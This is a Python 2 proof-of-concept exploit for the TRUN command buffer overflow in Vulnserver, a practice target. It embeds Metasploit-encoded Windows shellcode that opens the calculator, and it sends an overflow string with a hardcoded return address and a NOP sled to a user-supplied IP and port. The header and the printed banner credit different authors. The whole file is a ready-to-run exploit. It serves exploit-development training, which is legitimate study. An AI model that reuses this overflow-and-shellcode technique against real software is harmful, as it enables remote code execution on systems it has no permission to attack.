#! /usr/bin/python

#
# Vulnserver TRUN Command Buffer Overflow Exploit POC
# Created By : @Ice3man
# Email : Iceman12@protonmail.com
#
# Common Info :
#       Launches Calculator on Opening.

# Server Listens on Port : 9999 ( Commonly And Default )
# Pretty Simple : Neither DEP or Stack Canary Used.
#
#	Copyrights : @Ice3man
#   Regards : FuzzySecurity Blog
#			: Corelan Team
#			: SecuritySift
#


import socket

#----------------------- ShellCode ----------------------------------
#
# msfpayload -p windows/exec cmd=calc.exe -o R|
# msfencode -b '\x00\x0a\x0d' -t ruby
#

buf = ""
buf += "\xba\xdd\xfb\x26\x4c\xd9\xf6\xd9\x74\x24\xf4\x58\x31\xc9" 
buf += "\xb1\x33\x31\x50\x12\x03\x50\x12\x83\x1d\xff\xc4\xb9\x61" 
buf += "\xe8\x80\x42\x99\xe9\xf2\xcb\x7c\xd8\x20\xaf\xf5\x49\xf5" 
buf += "\xbb\x5b\x62\x7e\xe9\x4f\xf1\xf2\x26\x60\xb2\xb9\x10\x4f" 
buf += "\x43\x0c\x9d\x03\x87\x0e\x61\x59\xd4\xf0\x58\x92\x29\xf0" 
buf += "\x9d\xce\xc2\xa0\x76\x85\x71\x55\xf2\xdb\x49\x54\xd4\x50" 
buf += "\xf1\x2e\x51\xa6\x86\x84\x58\xf6\x37\x92\x13\xee\x3c\xfc" 
buf += "\x83\x0f\x90\x1e\xff\x46\x9d\xd5\x8b\x59\x77\x24\x73\x68" 
buf += "\xb7\xeb\x4a\x45\x3a\xf5\x8b\x61\xa5\x80\xe7\x92\x58\x93" 
buf += "\x33\xe9\x86\x16\xa6\x49\x4c\x80\x02\x68\x81\x57\xc0\x66" 
buf += "\x6e\x13\x8e\x6a\x71\xf0\xa4\x96\xfa\xf7\x6a\x1f\xb8\xd3" 
buf += "\xae\x44\x1a\x7d\xf6\x20\xcd\x82\xe8\x8c\xb2\x26\x62\x3e" 
buf += "\xa6\x51\x29\x54\x39\xd3\x57\x11\x39\xeb\x57\x31\x52\xda" 
buf += "\xdc\xde\x25\xe3\x36\x9b\xda\xa9\x1b\x8d\x72\x74\xce\x8c" 
buf += "\x1e\x87\x24\xd2\x26\x04\xcd\xaa\xdc\x14\xa4\xaf\x99\x92" 
buf += "\x54\xdd\xb2\x76\x5b\x72\xb2\x52\x38\x15\x20\x3e\x91\xb0" 
buf += "\xc0\xa5\xed"
# ------------------------ Info ------------------------------
print "[*] Vulnserver TRUN Command Buffer Overflow Exploit POC"
print "[*] Created By : Sh4d0w-l0rd"
print "[*] Email : Shad0w-l0rd@protonmail.com"
# ------------------------ Info ------------------------------
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creating Socket
ip = raw_input("\n\n[*] Please Enter IP : ") # Asking Target IP Address
port = raw_input("\n[*] Please Enter Port : ") # Asking Target Port
s.connect((ip, int(port))) #connecting to target
s.send("TRUN ." + "\x41"*2006 + "\xbb\x11\x50\x62" + "\x90"*16 + buf) # Sending Exploit
print "\n\n[*] Sending Exploit Payload . . ." # Sending Info
print "\n[*] Payload Send. Check If Calculator Popped Up.\n" # Sending Info 
s.close() # Closing Socket
